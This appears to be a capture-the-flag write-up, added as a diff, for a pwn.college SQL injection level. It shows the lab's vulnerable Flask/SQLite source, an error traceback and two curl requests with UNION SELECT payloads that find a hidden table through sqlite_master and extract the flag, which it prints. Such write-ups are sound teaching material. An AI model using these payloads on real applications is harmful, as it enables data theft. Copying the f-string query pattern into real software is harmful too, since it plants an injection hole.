@@ -1,0 +1,56 @@
+# Level 6
+
+We are given with a takl of `Exploit a structured query language injection vulnerability with an unknown database structure`
+
+We are given with machine and souce code of the machine
+
+```python {3} /{query}/ copy
+
+def level6():
+    table_name = f"table{hash(flag) & 0xFFFFFFFFFFFFFFFF}"
+    db.execute((f"CREATE TABLE IF NOT EXISTS {table_name} AS "
+                'SELECT "flag" AS username, ? AS password'),
+               (flag,))
+
+    query = request.args.get("query", "%")
+    users = db.execute(f'SELECT username FROM {table_name} WHERE username LIKE "{query}"').fetchall()
+    return "".join(f'{user["username"]}\n' for user in users)
+
+```
+
+It is same challenge as level 5 but here we have to find the table name which is created by the hash of the flag
+
+when we pass the previous query we got errors
+
+```bash /sqlite3/
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.8/dist-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.8/dist-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+  File "/challenge/run", line 670, in catch_all
+    return challenge()
+  File "/challenge/run", line 158, in level6
+    users = db.execute(f'SELECT username FROM {table_name} WHERE username LIKE "{query}"').fetchall()
+  File "/challenge/run", line 39, in execute
+    result = cursor.execute(sql, parameters)
+sqlite3.OperationalError: no such table: users
+```
+
+Now we now its a sqlite database and we can use `sqlite_master` to get the table name
+
+```bash /sqlite3/ copy
+curl -X GET 'http://challenge.localhost/?query=flag" UNION SELECT tbl_name FROM sqlite_master-- -'
+```
+
+reponse is `table10623237887438613517`
+
+Now we can use this table name to get the flag
+
+```bash copy
+curl -X GET 'http://challenge.localhost/?query=flag" UNION SELECT password FROM table10623237887438613517-- -'
+```
+That retrived the flag for us 🚩 
+```bash copy
+pwn.college{gfxwg_D78SD3e4-8ri7H45vME8Y.dJTOzMDL0IzMyMzW}
+```
